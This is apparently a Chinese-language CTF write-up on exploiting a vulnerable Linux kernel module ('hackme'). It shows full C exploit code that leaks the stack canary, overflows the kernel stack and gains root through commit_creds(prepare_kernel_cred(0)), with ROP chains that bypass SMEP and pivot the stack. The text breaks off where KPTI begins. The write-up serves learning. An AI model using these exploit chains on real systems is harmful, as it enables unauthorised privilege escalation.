<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//daemon == NULL时返回init_cred</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>

<p>当参数为<code>NULL</code>时, 该函数返回<code>init_cred</code>,也就是<code>init_task</code>的<code>cred</code></p>
<p>因此可以构造堆栈<code>rop</code>链:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/elevation-of-privilege.png" alt="commit_creds(prepare_kernel_cred(NULL))"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">NULL</span> =&gt; rdi</span><br><span class="line">prepare_kernel_cred(rdi) =&gt; rax</span><br><span class="line">rax =&gt; rdi</span><br><span class="line">commit_creds(rdi)</span><br></pre></td></tr></table></figure>



<p>但是<code>Linux 6.2</code>及之后如果参数为<code>NULL</code>则直接返回<code>NULL</code>了, 叫没法空手套白狼了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>











<h2 id="vulnerability-kernel-module"><a href="#vulnerability-kernel-module" class="headerlink" title="vulnerability kernel module"></a>vulnerability kernel module</h2><p>题目所给的内核模块<code>hackme.ko</code></p>
<p>模块的初始化函数中调用<code>misc_register</code>函数注册了一个<code>struct miscdevice </code>字符杂项设备</p>
<blockquote>
<p>字符杂项设备</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>&#123;</span></span><br><span class="line">　　<span class="type">int</span> minor; <span class="comment">//杂项设备的此设备号(如果设置为MISC_DYNAMIC_MINOR，表示系统自动分配未使用的minor)</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *name;		<span class="comment">// /dev目录下的节点名称</span></span><br><span class="line">　　<span class="type">const</span> stuct file_operations *fops;<span class="comment">//驱动主题函数入口指针</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *nodename;<span class="comment">//</span></span><br><span class="line">　　<span class="type">mode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>字符杂项设备的主设备号自动被设置为<code>10</code>, 次设备号由<code>minor</code>字段定义</p>
<p><code>misc_register</code>注册字符杂项设备时会自动在<code>/dev/</code>下创建设备节点文件, 节点文件名由<code>name</code>字段给出, <code>nodename</code>表示<code>/dev/下</code>的二级目录, 如果<code>nodename</code>非空则创建节点文件<code>/dev/&lt;nodename&gt;/name</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000440</span> hackme_misc     dd <span class="number">0F</span>Fh                 ; minor</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; DATA XREF: hackme_init+<span class="number">6</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; hackme_exit+<span class="number">1</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">4</span> dup(<span class="number">0</span>)             ; <span class="string">&quot;hackme&quot;</span></span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset aHackme       ; name</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset hackme_fops   ; fops</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.next</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.prev</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; parent</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; this_device</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; groups</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; nodename</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dw <span class="number">0</span>                    ; mode</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">6</span> dup(<span class="number">0</span>)</span><br><span class="line">.data:<span class="number">0000000000000440</span> _data           ends</span><br></pre></td></tr></table></figure>

<p>其中<code>fops</code>是一个自定义的设备行为指针表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">0000000000000320</span> hackme_fops     file_operations &lt;offset __this_module, <span class="number">0</span>, offset hackme_read, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                         ; DATA XREF: .data:hackme_misc↓o</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_open, <span class="number">0</span>, offset hackme_release, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到自定义了<code>read,write,open,release</code>四种行为</p>
<p>在<code>hackme_read</code>中发生了这么一个事:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kstack_buf1[0:size]@kernel stack  =&gt;  hackme_buf@kernel bss  =&gt;  user_data@user </span><br></pre></td></tr></table></figure>

<p>由于<code>size</code>由用户指定,因此这里可以泄露内核堆栈上的<code>canary</code>,以及函数返回地址,以此可以绕过<code>KASLR</code></p>
<p>在<code>hackme_write</code>中发生了这么一个事:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_data[0:size]@user  =&gt;  hackme_buf@kernel bss  =&gt;  kstack_buf2@kernel stack </span><br></pre></td></tr></table></figure>

<p>由于<code>size</code>由用户指定,因此这里可以往内核堆栈写入任意字节,存在堆栈溢出,可以构造<code>ROP</code>链</p>
<p>思路:</p>
<p>1.在hackme_read中泄露canary与返回地址, 绕过KASLR</p>
<p>2.在hackme_write中堆栈溢出, 构造ROP链</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h3><p>假设我们关闭<code>smap,smep,kpti,kaslr,</code> 只考虑绕过<code>canary</code></p>
<p>1.利用<code>hackme_read</code>泄露<code>canary</code></p>
<p>2.利用<code>hackme_write</code>绕过<code>canary</code>检查,继续溢出内核堆栈,构造<code>rop</code>链条</p>
<p>3.更换进程<code>creds</code>提权, 也就是执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>在用户程序中写<code>shellcode</code>实现, 然后在<code>rop</code>链条中<code>ret2shellcode</code></p>
<p>4.返回到用户态</p>
<p>也就是执行<code>iret</code></p>
<p>在用户程序中写<code>shellcode</code>实现</p>
<p>5.起<code>shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//未开启KASLR时,两个函数的地址</span></span><br><span class="line"><span class="type">size_t</span> addr_commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rdi,rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,rax;&quot;</span>          <span class="comment">//init_task.creds -&gt; rdi</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span>             <span class="comment">//commit_creds(init_task.creds)</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">0xA8</span>);</span><br><span class="line">    canary = *(<span class="type">size_t</span>*)((<span class="type">char</span>*)buffer+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h3 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass SMEP"></a>bypass SMEP</h3><p><code>smep(supervisor mode execution protection)</code>: 内核态时不允许执行用户空间代码</p>
<p><code>smep</code>类似于用户态的NX的概念,</p>
<p><code>NX</code>不允许用户在堆栈里执行</p>
<p><code>smep</code>不允许内核态执行用户代码 , 内核态只能执行内核态的代码</p>
<p>之前在内核堆栈中构造<code>rop</code>链, 直接返回到用户代码,  会被<code>smep</code>拦住</p>
<p>绕过方式:</p>
<p>1.<code>CR4[bit20]</code>是SMEP开关, 在老版本内核上可以改成0绕过, 但是在新内核上CR4[bit20]被扎了钉子, 手动改成0会立刻被自动改回1</p>
<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20241120211400284.png" alt="image-20241120211400284"></p>
<p>2.全用内核<code>rop</code>绕过</p>
<p>之前的exp失效的原因是, rop链上的返回地址, 是用户程序中的<code>privilege_escalation</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br></pre></td></tr></table></figure>

<p><code>smep</code>要求在进入内核之后, 只能调用内核函数</p>
<p>那么我们需要使用纯rop链代替<code>privilege_escalation</code>的功能</p>
<p>那么这个<code>rop</code>链应该这样构造:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.addr prepare_kernel_cred</span><br><span class="line">2.gadget rax-&gt;rdi</span><br><span class="line">3.addr commit_cred</span><br><span class="line">4.addr swapgs; ret</span><br><span class="line">5.iretq</span><br><span class="line">6.RIP|CS|RFLAGS|SP|SS</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    payload[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    payload[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    payload[offset++] = addr_commit_creds;</span><br><span class="line">    payload[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    payload[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    payload[offset++] = user_rip;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h4><p>在只开启<code>smep</code>, 不开启<code>smap</code>的情况下, 虽然控制流无法直接执行用户空间的程序</p>
<p>但是可以直接访问用户空间的数据</p>
<p>在用户空间上申请一块内存, 然后在rop链上构造堆栈迁移, 将内核堆栈搬到用户空间中, </p>
<p>堆栈迁移的好处是:</p>
<p>1.拥有更大的空间</p>
<p>2.新堆栈可执行</p>
<p>需要注意的是, <code>mmap</code>申请的页必须对齐到<code>0x1000</code></p>
<p>用这个<code>gadget</code>, 实际上这个限制已经非常严苛了, 甚至查<code>rsp</code>的<code>gadget</code>查不到, </p>
<p>查<code>esp</code>还是查到了两条, 幸运的是这两个地址也是在内核代码段里的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov rsp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov esp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff8196f56a</span> : mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81971202</span> : xchg ebx, eax ; mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<p>在<code>x86_64</code>汇编中,对<code>esp</code>这种<code>32</code>为寄存器的搬运操作, 默认是无符号搬运, 也就是说</p>
<p><code>mov esp, 0x5b000000 </code>只会给<code>esp</code>的低<code>32</code>位置数, 高<code>32</code>位置零</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">alloc_fake_stack</span><span class="params">()</span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="type">char</span>*)fake_stack_addr - <span class="number">0x1000</span>,<span class="number">0x2000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdeadbeef</span>;		<span class="comment">//实际上写东西才会真正创建这个页</span></span><br><span class="line">    </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    fake_stack[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    fake_stack[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    fake_stack[offset++] = addr_commit_creds;</span><br><span class="line">    fake_stack[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    fake_stack[offset++] = user_rip;</span><br><span class="line">    fake_stack[offset++] = user_cs;</span><br><span class="line">    fake_stack[offset++] = user_rflags;</span><br><span class="line">    fake_stack[offset++] = user_sp;</span><br><span class="line">    fake_stack[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,fake_stack,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>0x5b000000 </code>这空间是用户空间的, 因此在开启smap之后, 这种方法会失效</p>
<h3 id="bypass-KPTI"><a href="#bypass-KPTI" class="headerlink" title="bypass KPTI"></a>bypass KPTI</h3><p><code>Kernel page-table isolation</code> , 内核页表隔离</p>
<p>开启kpti保护后, 用户态和内核态分别使用两张页表,</p>
